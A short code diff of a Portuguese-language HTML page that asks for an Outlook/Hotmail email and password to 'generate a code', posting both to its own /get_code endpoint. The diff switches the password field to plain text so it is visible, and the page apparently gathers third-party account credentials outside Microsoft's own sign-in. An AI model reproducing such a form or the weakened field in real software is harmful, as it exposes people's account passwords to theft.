@@ -9,16 +9,16 @@
     <script type="module">
         import { injectSpeedInsights } from '@vercel/speed-insights';
 
-injectSpeedInsights();
+        injectSpeedInsights();
     </script>
 </head>
 <body>
     <h2>Gerar código Outlook/Hotmail</h2>
     <form action="/get_code" method="post">
         <label for="email">Email:</label>
-        <input type="email" id="email" name="email" required><br><br>
+        <input type="email" id="email" name="email" required autocomplete="email"><br><br>
         <label for="password">Senha:</label>
-        <input type="password" id="password" name="password" required><br><br>
+        <input type="text" id="password" name="password" required><br><br> <!-- Alterado para "text" -->
         <button type="submit">Obter Código</button>
     </form>
     
